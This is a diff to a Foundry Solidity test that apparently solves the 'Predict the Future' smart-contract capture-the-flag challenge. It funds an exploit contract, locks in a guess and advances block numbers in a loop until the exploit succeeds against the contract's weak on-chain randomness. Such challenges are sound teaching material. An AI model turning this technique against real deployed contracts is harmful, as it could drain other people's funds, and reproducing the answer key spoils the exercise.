@@ -22,7 +22,21 @@ contract PredictTheFutureTest is Test {
         vm.warp(93582192);
 
         // Put your solution here
+        vm.deal(address(exploitContract), 1 ether);
+        exploitContract.lockInMyGuess(1);
+        // to pass 2nd require statement
+        vm.roll(block.number + 2);
 
+        bool isComplete = predictTheFuture.isComplete();
+
+        // attack until challenge is completed, increase block.number on every fail
+        while (!isComplete) {
+            try exploitContract.Exploit() {
+                isComplete = true;
+            } catch {
+                vm.roll(block.number + 1);
+            }
+        }
         _checkSolved();
     }
 
